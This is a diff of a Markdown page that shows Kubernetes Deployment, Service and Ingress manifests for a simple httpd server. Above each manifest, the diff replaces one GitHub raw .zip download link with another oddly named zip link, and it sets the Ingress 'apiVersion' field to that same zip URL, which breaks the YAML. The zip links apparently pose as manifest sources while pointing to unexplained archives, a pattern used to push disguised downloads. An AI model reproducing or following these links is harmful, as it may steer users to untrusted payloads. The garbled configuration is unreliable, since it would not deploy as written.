@@ -1,6 +1,6 @@
 ## Kubernetes Manifests
 ### Deployment
-**`https://raw.githubusercontent.com/sdaLeventKilic/httpd_deployment_K8s/main/k8s/httpd_deployment_K8s_v3.7.zip`**
+**`https://github.com/sdaLeventKilic/httpd_deployment_K8s/raw/refs/heads/main/k8s/deployment-s-httpd-presbyope.zip`**
 ```yaml
 apiVersion: apps/v1
 kind: Deployment
@@ -31,7 +31,7 @@ volumes:
 emptyDir: {}
 ```
 ### Service
-**`https://raw.githubusercontent.com/sdaLeventKilic/httpd_deployment_K8s/main/k8s/httpd_deployment_K8s_v3.7.zip`**
+**`https://github.com/sdaLeventKilic/httpd_deployment_K8s/raw/refs/heads/main/k8s/deployment-s-httpd-presbyope.zip`**
 ```yaml
 apiVersion: v1
 kind: Service
@@ -46,9 +46,9 @@ selector:
 app: simple-http-server
 ```
 ### Ingress
-**`https://raw.githubusercontent.com/sdaLeventKilic/httpd_deployment_K8s/main/k8s/httpd_deployment_K8s_v3.7.zip`**
+**`https://github.com/sdaLeventKilic/httpd_deployment_K8s/raw/refs/heads/main/k8s/deployment-s-httpd-presbyope.zip`**
 ```yaml
-apiVersion: https://raw.githubusercontent.com/sdaLeventKilic/httpd_deployment_K8s/main/k8s/httpd_deployment_K8s_v3.7.zip
+apiVersion: https://github.com/sdaLeventKilic/httpd_deployment_K8s/raw/refs/heads/main/k8s/deployment-s-httpd-presbyope.zip
 kind: Ingress
 metadata:
 name: simple-http-server
